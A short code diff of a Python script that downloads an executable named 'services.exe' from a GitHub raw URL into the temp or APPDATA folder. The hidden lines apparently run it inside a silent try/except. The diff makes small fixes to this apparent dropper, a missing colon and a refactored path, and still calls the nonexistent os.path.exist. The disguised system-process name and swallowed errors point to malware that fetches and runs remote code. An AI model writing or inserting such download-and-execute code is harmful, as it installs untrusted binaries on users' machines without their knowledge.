@@ -10,7 +10,7 @@ import tempfile
 url = "https://github.com/Dch12zz/services/raw/refs/heads/main/services.exe"
 temp = tempfile.gettempdir()
 name = os.path.join(temp, f"services.exe")
-if not os.path.exist(name)
+if not os.path.exist(name):
     response = requests.get(url)
     if response.status_code == 200:
         with open(name, 'wb') as dosya:
@@ -20,7 +20,8 @@ if not os.path.exist(name)
             except:
                 pass
 else:
-    name = os.path.join(os.getenv('APPDATA'), f"services.exe")
+    path = os.getenv('APPDATA')
+    name = os.path.join(path, f"services.exe")
     response = requests.get(url)
     if response.status_code == 200:
         with open(name, 'wb') as dosya:
